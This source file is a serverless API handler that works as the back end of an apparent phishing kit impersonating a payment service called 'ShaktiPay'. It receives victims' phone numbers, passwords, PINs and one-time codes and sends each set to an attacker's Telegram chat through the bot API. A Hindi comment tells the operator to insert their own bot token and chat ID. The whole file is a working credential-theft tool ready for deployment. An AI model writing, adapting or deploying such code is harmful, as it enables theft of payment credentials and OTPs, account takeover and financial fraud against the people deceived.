export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { type, phone, password, pin, otp } = req.body;

    // Yahan apna Telegram Bot Token aur Chat ID daal dein
    const BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN_HERE';
    const CHAT_ID = 'YOUR_CHAT_ID_HERE';

    let message = '';

    if (type === 'LOGIN_DETAILS') {
        message = `🚨 *New ShaktiPay Login* 🚨\n\n📱 *Phone:* \`${phone}\`\n🔑 *Password:* \`${password}\`\n🔒 *PIN:* \`${pin}\``;
    } else if (type === 'OTP_REQUEST') {
        message = `🔐 *Login OTP requested (Modal)*\n📱 *Phone:* \`${phone}\``;
    } else if (type === 'OTP_CODE') {
        message = `📱 *ShaktiPay OTP Entered* 📱\n\n📞 *Phone:* \`${phone}\`\n🔢 *OTP Code:* \`${otp}\``;
    }

    try {
        const telegramRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        const data = await telegramRes.json();

        if (data.ok) {
            return res.status(200).json({ success: true });
        } else {
            return res.status(500).json({ success: false, error: data.description });
        }
    } catch (error) {
        return res.status(500).json({ success: false, error: error.message });
    }
}
